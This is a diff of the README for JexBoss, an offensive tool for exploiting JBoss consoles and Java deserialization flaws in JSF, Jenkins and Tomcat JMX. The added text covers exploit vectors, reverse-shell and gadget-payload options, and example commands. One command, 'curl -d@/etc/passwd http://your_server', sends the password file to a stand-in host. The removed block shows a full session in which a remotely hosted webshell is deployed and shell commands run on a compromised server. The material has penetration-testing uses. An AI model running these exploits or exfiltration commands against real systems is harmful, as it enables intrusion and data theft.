@@ -1,8 +1,7 @@
-JexBoss - JBoss (and others Java application servers) verify and EXploitation Tool
-==================================================================================
+JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool
+==============================================================================================
 
-JexBoss is a tool for testing and exploiting vulnerabilities in JBoss Application Server
-And Others Java Aplication Servers (eg. WebLogic, Glassfish, Tomcat, Axis2, etc)
+JexBoss is a tool for testing and exploiting vulnerabilities in JBoss Application Server and others Java Platforms, Frameworks, Applications, etc.
 
 Requirements
 ----
@@ -58,46 +57,59 @@ If you are using Windows, you can use the [Git Bash](https://github.com/git-for-
 
 Features
 ----
-The tool and exploits were developed and tested for versions 3, 4, 5 and 6 of the JBoss Application Server.
+The tool and exploits were developed and tested for:
+
+* JBoss Application Server versions: 3, 4, 5 and 6.
+* Java Deserialization Vulnerabilities in multiple java frameworks, platforms and applications (e.g., Java Server Faces - JSF, Seam Framework, RMI over HTTP, Jenkins CLI RCE (CVE-2015-5317), Remote JMX (CVE-2016-3427, CVE-2016-8735), etc)
 
 The exploitation vectors are:
 
-* /admin-console [ NEW ]
+* /admin-console
 	- tested and working in JBoss versions 5 and 6
 * /jmx-console
 	- tested and working in JBoss versions 4, 5 and 6
 * /web-console/Invoker
-	- tested and working in JBoss versions 4
+	- tested and working in JBoss versions 4, 5 and 6
 * /invoker/JMXInvokerServlet
-	- tested and working in JBoss versions 4 and 5
+	- tested and working in JBoss versions 4, 5 and 6
+* Application Deserialization
+    - tested and working against multiple java applications, platforms, etc, via HTTP POST Parameters
+* Servlet Deserialization
+    - tested and working against multiple java applications, platforms, etc, via servlets that process serialized objets (e.g. when you see an "Invoker" in a link)
+* Others
 
-Reverse Shell (meterpreter integration)
----------------------------------------
-After exploit a server, you can use the own jexboss shell of commands or perform a reverse connection using the following command:
-```
-   jexremote=YOUR_IP:YOUR_PORT
+Videos
+------
 
-   Example:
-     Shell>jexremote=192.168.0.10:4444
-```
+* Exploiting Java Deserialization Vulnerabilities (RCE) on JSF/Seam Applications via javax.faces.ViewState with JexBoss
 
-* Example:
-![alt tag](https://github.com/joaomatosf/jexboss/raw/master/screenshots/jexbossreverse.png)
+[![Alt text](https://img.youtube.com/vi/VaLSYzEWgVE/0.jpg)](https://www.youtube.com/watch?v=VaLSYzEWgVE)
+
+* Exploiting JBoss Application Server with JexBoss
+
+[![Alt text](https://img.youtube.com/vi/yI54sRqFOyI/0.jpg)](https://www.youtube.com/watch?v=yI54sRqFOyI)
+
 
 Screenshots
 ----
 
-* Standalone mode:
+* Simple usage examples:
 ```
-$ python jexboss.py -host 192.168.0.114:8080
+$ python jexboss.py
 ```
-![alt tag](https://github.com/joaomatosf/jexboss/raw/master/screenshots/standalone_mode.png)
+![alt tag](https://github.com/joaomatosf/jexboss/raw/master/screenshots/simple_usage_help.png)
+
+* Example of standalone mode against JBoss:
+```
+$ python jexboss.py -u http://192.168.0.26:8080
+```
+![alt tag](https://github.com/joaomatosf/jexboss/raw/master/screenshots/standalone_mode1.png)
+![alt tag](https://github.com/joaomatosf/jexboss/raw/master/screenshots/standalone_mode2.png)
 
 * Usage modes:
 ```
 $ python jexboss.py -h
 ```
-![alt tag](https://github.com/joaomatosf/jexboss/raw/master/screenshots/help_usage.png)
 
 * Network scan mode:
 ```
@@ -111,14 +123,44 @@ $ python jexboss.py -mode auto-scan -A -network 192.168.0.0/24 -ports 8080 -resu
 ```
 ![alt tag](https://github.com/joaomatosf/jexboss/raw/master/screenshots/scan_with_auto_exploit_mode.png)
 
-
 * Results and recommendations:
 
-![alt tag](https://github.com/joaomatosf/jexboss/raw/master/screenshots/results_and_recommendations.png)
+![alt tag](https://github.com/joaomatosf/jexboss/raw/master/screenshots/results_and_recommendations2.png)
 
-Usage example
-----
-* Check the file "demo.png"
+
+Reverse Shell (meterpreter integration)
+---------------------------------------
+After you exploit a JBoss server, you can use the own jexboss command shell or perform a reverse connection using the following command:
+```
+   jexremote=YOUR_IP:YOUR_PORT
+
+   Example:
+     Shell>jexremote=192.168.0.10:4444
+```
+
+* Example:
+![alt tag](https://github.com/joaomatosf/jexboss/raw/master/screenshots/jexbossreverse2.jpg)
+
+When exploiting java deserialization vulnerabilities (Application Deserialization, Servlet Deserialization), the default options are: make a reverse shell connection or send a commando to execute.
+
+
+Usage examples
+--------------
+
+* For Java Deserialization Vulnerabilities in a custom HTTP parameter and to send a custom command to be executed on the exploited server:
+```
+$ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize -H parameter_name --cmd 'curl -d@/etc/passwd http://your_server'
+```
+
+* For Java Deserialization Vulnerabilities in a custom HTTP parameter and to make a reverse shell (this will ask for an IP address and port of your remote host):
+```
+$ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize -H parameter_name
+```
+
+* For Java Deserialization Vulnerabilities in a Servlet (like Invoker):
+```
+$ python jexboss.py -u http://vulnerable_java_app/path --servlet-unserialize
+```
 
 * Auto scan mode:
 ```
@@ -133,8 +175,6 @@ $ python jexboss.py -mode file-scan -file host_list.txt -out report_file_scan.lo
 * More Options:
 
 ```
-$ python jexboss.py -h
-
 optional arguments:
   -h, --help            show this help message and exit
   --version             show program's version number and exit
@@ -147,7 +187,19 @@ optional arguments:
                         check for updates performed by the jexboss client at
                         http://joaomatosf.com/rnp/releases.txt
   -mode {standalone,auto-scan,file-scan}
-                        Operation mode
+                        Operation mode (DEFAULT: standalone)
+  --app-unserialize, -j
+                        Check for java unserialization vulnerabilities in HTTP
+                        parameters (eg. javax.faces.ViewState, oldFormData,
+                        etc)
+  --servlet-unserialize, -l
+                        Check for java unserialization vulnerabilities in
+                        Servlets (like Invoker interfaces)
+  --jboss               Check only for JBOSS vectors.
+  --jenkins             Check only for Jenkins CLI vector.
+  --jmxtomcat           Check JMX JmxRemoteLifecycleListener in Tomcat
+                        (CVE-2016-8735 and CVE-2016-8735). OBS: Will not be
+                        checked by default.
   --proxy PROXY, -P PROXY
                         Use a http proxy to connect to the target URL (eg. -P
                         http://192.168.0.1:3128)
@@ -162,6 +214,34 @@ Standalone mode:
   -host HOST, -u HOST   Host address to be checked (eg. -u
                         http://192.168.0.10:8080)
 
+Advanced Options (USE WHEN EXPLOITING JAVA UNSERIALIZE IN APP LAYER):
+  --reverse-host RHOST:RPORT, -r RHOST:RPORT
+                        Remote host address and port for reverse shell when
+                        exploiting Java Deserialization Vulnerabilities in
+                        application layer (for now, working only against *nix
+                        systems)(eg. 192.168.0.10:1331)
+  --cmd CMD, -x CMD     Send specific command to run on target (eg. curl -d
+                        @/etc/passwd http://your_server)
+  --windows, -w         Specifies that the commands are for rWINDOWS System$
+                        (cmd.exe)
+  --post-parameter PARAMETER, -H PARAMETER
+                        Specify the parameter to find and inject serialized
+                        objects into it. (egs. -H javax.faces.ViewState or -H
+                        oldFormData (<- Hi PayPal =X) or others) (DEFAULT:
+                        javax.faces.ViewState)
+  --show-payload, -t    Print the generated payload.
+  --gadget {commons-collections3.1,commons-collections4.0,groovy1}
+                        Specify the type of Gadget to generate the payload
+                        automatically. (DEFAULT: commons-collections3.1 or
+                        groovy1 for JenKins)
+  --load-gadget FILENAME
+                        Provide your own gadget from file (a java serialized
+                        object in RAW mode)
+  --force, -F           Force send java serialized gadgets to URL informed in
+                        -u parameter. This will send the payload in multiple
+                        formats (eg. RAW, GZIPED and BASE64) and with
+                        different Content-Types.
+
 Auto scan mode:
   -network NETWORK      Network to be checked in CIDR format (eg. 10.0.0.0/8)
   -ports PORTS          List of ports separated by commas to be checked for
@@ -175,116 +255,6 @@ File scan mode:
                         File name to store the file scan results
 
 ```
-
-* Standalone mode:
-
-```
-* Installation via git:
-
-$ git clone https://github.com/joaomatosf/jexboss.git
-$ cd jexboss
-$ python jexboss.py -host https://site-teste.com
-
-* Or via download:
-
-$ wget https://github.com/joaomatosf/jexboss/archive/master.zip
-$ unzip master.zip
-$ cd jexboss-master
-$ python jexboss.py -host https://site-teste.com
-
-
- * --- JexBoss: Jboss verify and EXploitation Tool  --- *
- |                                                      |
- | @author:  João Filho Matos Figueiredo                |
- | @contact: joaomatosf@gmail.com                       |
- |                                                      |
- | @update: https://github.com/joaomatosf/jexboss       |
- #______________________________________________________#
-
-
- ** Checking Host: https://site-teste.com **
-
- * Checking admin-console: 	       [ EXPOSED ]
- * Checking web-console: 	       [ OK ]
- * Checking jmx-console: 	       [ VULNERABLE ]
- * Checking JMXInvokerServlet: 	   [ VULNERABLE ]
-
-
- * Do you want to try to run an automated exploitation via "jmx-console" ?
-   This operation will provide a simple command shell to execute commands on the server..
-   Continue only if you have permission!
-   yes/NO ? yes
-
- * Sending exploit code to https://site-teste.com. Wait...
-
-
- * Info: This exploit will force the server to deploy the webshell
-   available on: http://www.joaomatosf.com/rnp/jbossass.war
- * Successfully deployed code! Starting command shell, wait...
-
- * - - - - - - - - - - - - - - - - - - - - LOL - - - - - - - - - - - - - - - - - - - - *
-
- * https://site-teste.com:
-
- Linux seglinux 3.18.4-1.el6.elrepo.x86_64 #1 SMP Wed Jan 28 13:28:52 EST 2015 x86_64 x86_64 x86_64 GNU/Linux
-
- CentOS release 6.5 (Final)
-
- uid=509(jboss) gid=509(jboss) grupos=509(jboss) context=system_u:system_r:initrc_t:s0
-
-[Type commands or "exit" to finish]
-Shell> pwd
-/usr/jboss-6.1.0.Final/bin
-
-[Type commands or "exit" to finish]
-Shell> hostname
-fwgw
-
-[Type commands or "exit" to finish]
-Shell> ls -all /home
-total 16
-drwxr-xr-x.  4 root  root  4096 Jan 26  2015 .
-dr-xr-xr-x. 23 root  root  4096 Mar 31 04:51 ..
--rwxrwxrwx.  1 root  root     0 Jan 26  2015 file1
--rw-r-----.  1 root  root     0 Jan 26  2015 file2
--rw-rw-r--.  1 root  root     0 Jan 26  2015 file3
-drwx------.  2 joao  joao  4096 Jan 26  2015 joao
-drwx------.  2 maria maria 4096 Jan 26  2015 maria
-
-[Type commands or "exit" to finish]
-Shell>exit
-
-Results: potentially compromised server!
- * - - - - - - -  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*
- Recommendations:
- - Remove web consoles and services that are not used, eg:
-    $ rm web-console.war
-    $ rm http-invoker.sar
-    $ rm jmx-console.war
-    $ rm jmx-invoker-adaptor-server.sar
-    $ rm admin-console.war
- - Use a reverse proxy (eg. nginx, apache, F5)
- - Limit access to the server only via reverse proxy (eg. DROP INPUT POLICY)
- - Search vestiges of exploitation within the directories "deploy" and "management".
-
- References:
-   [1] - https://developer.jboss.org/wiki/SecureTheJmxConsole
-   [2] - https://issues.jboss.org/secure/attachment/12313982/jboss-securejmx.pdf
-
- - If possible, discard this server!
- * - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*
-
- * Info: review, suggestions, updates, etc:
-   https://github.com/joaomatosf/jexboss
-
- * DONATE: Please consider making a donation to help improve this tool,
-           including research to new versions of JBoss and zero days.
-
- * Paypal:  joaomatosf@gmail.com
- * Bitcoin Address:  14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C
- * URI:  bitcoin:14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C?label=jexboss
-```
-
 
 
 Questions, problems, suggestions and etc:
